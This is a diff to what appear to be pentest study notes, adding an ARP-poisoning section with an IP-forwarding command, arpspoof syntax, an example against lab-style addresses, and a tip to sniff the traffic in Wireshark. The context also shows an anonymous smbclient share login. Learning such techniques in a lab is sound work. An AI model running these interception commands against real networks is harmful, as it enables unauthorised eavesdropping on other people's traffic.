@@ -153,7 +153,20 @@ to download files we can use the scp (secure copy) command as follows:
 
 `smbclient //<target>/share_file -N`
 
+*ARP Poisoning*
 
+Linux Kernel IP Forwarding, a feature that transforms a Linux box into a router.
+By enabling IP Forwarding, yopu tell the machine to forward the packets you intercept to the real destination host.
+
+`echo 1 > /proc/sys/net/ipv4/ip_forward`
+
+`arpspoof -i <interface> -t <target> -r <host>`
+
+- `target and host` are the victims IP addresses. Where `target` can be the server and `host` the client
+
+`arpspoof -i tap0 -t 10.100.13.37 -r 10.100.13.36`
+
+Now I can launch Wireshark to intercept the trafic. Don't forget to specify the filter of `service` 
 
 
 
